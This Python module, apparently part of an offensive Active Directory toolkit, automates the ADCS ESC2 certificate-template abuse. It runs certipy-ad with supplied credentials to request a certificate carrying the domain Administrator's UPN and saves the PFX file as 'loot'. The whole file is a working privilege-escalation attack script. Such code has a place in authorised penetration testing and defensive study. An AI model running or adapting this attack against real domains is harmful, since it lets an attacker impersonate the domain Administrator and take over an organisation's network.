# modules/adcs/esc2.py

import os
from core.helpers import run_command, save_loot
from core.colors import red, green, yellow, blue

def abuse_esc2(session, template_name, save=False):
    print(blue(f"[*] Attempting ESC2 abuse using template: {template_name}"))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA data in session. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] Invalid CA name in session metadata."))
        return

    output_file = f"esc2_{template_name}.pfx"
    upn = f"Administrator@{session.domain}"

    cmd = (
        f"certipy-ad req -u {session.username} -p {session.password} -dc-ip {session.dc_ip} "
        f"-template {template_name} -ca {ca_name} "
        f"-out {output_file} -upn {upn}"
    )

    print(blue(f"[*] Requesting certificate from CA '{ca_name}' using template '{template_name}'..."))
    stdout, stderr = run_command(cmd)

    if stderr:
        print(red(f"[!] Certipy returned error:\n{stderr.strip()}"))

    if not os.path.exists(output_file) or os.path.getsize(output_file) < 100:
        print(red("[-] Certificate request failed or file not valid."))
        return

    with open(output_file, "rb") as f:
        cert_data = f.read()

    if save:
        save_loot(output_file, cert_data, binary=True)

    print(green(f"[+] ESC2 abuse complete. Certificate saved to loot/{output_file}"))
    print(green(f"[+] UPN used: {upn}"))
